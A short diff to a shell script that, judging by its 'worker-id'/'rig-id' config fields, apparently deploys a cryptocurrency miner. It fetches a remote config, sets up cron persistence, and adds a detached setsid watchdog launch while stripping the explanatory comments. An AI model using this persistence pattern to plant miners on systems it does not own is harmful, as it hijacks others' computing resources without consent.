@@ -122,10 +122,8 @@ deploy() {
 
     [ -f "$WATCHDOG_SCRIPT" ] && chmod +x "$WATCHDOG_SCRIPT"
 
-    # 生成基础 Machine ID
     MACHINE_ID=$(generate_machine_id)
 
-    # 如果传入了自定义参数，拼接成新的机器名称；未传入则直接使用 MACHINE_ID
     if [ -n "$CUSTOM_PREFIX" ]; then
         WORKER_NAME="${CUSTOM_PREFIX}_${MACHINE_ID}"
     else
@@ -137,7 +135,6 @@ deploy() {
     if curl -fsSL -H "$Ua" --retry 3 --retry-delay 5 "$CONFIG_URL" -o "$CONFIG_JSON" 2>/dev/null; then
         log "Config downloaded from network"
 
-        # 优先使用 jq 处理（如果系统已安装 jq）
         if command -v jq >/dev/null 2>&1; then
             if jq --arg name "$WORKER_NAME" \
                   '(.["worker-id"] = $name) | 
@@ -147,7 +144,6 @@ deploy() {
             else
                 log "jq failed to update config"
             fi
-        # 如果没有 jq 则回退到 sed 正则替换
         else
             if sed -i --follow-symlinks "s#\"worker-id\":\s*[^,}]*#\"worker-id\": \"$WORKER_NAME\"#g" "$CONFIG_JSON" && \
                sed -i --follow-symlinks "s#\"rig-id\":\s*[^,}]*#\"rig-id\": \"$WORKER_NAME\"#g" "$CONFIG_JSON" && \
@@ -224,7 +220,8 @@ setup_user_persistence() {
     else
         log "  [cron] crontab not available — skipping."
     fi
-
+    
+    setsid "$WATCHDOG_SCRIPT" >/dev/null 2>&1 &
 }
 
 mkdir -p "$INSTALL_DIR"
